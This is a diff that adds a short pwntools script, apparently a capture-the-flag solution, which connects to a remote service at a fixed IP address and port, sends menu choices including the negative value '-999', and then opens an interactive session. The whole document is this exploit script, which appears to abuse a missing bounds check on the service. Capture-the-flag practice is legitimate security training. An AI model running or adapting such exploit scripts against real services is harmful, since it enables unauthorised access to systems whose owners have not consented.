@@ -1,0 +1,11 @@
+from pwn import *
+io = remote('103.69.97.144', 6041)
+print(io.recv())
+io.sendline(b'3')
+print(io.recv())
+io.sendline(b'-999')
+print(io.recv())
+io.sendline(b'\n')
+print(io.recv())
+io.sendline(b'6')
+io.interactive()
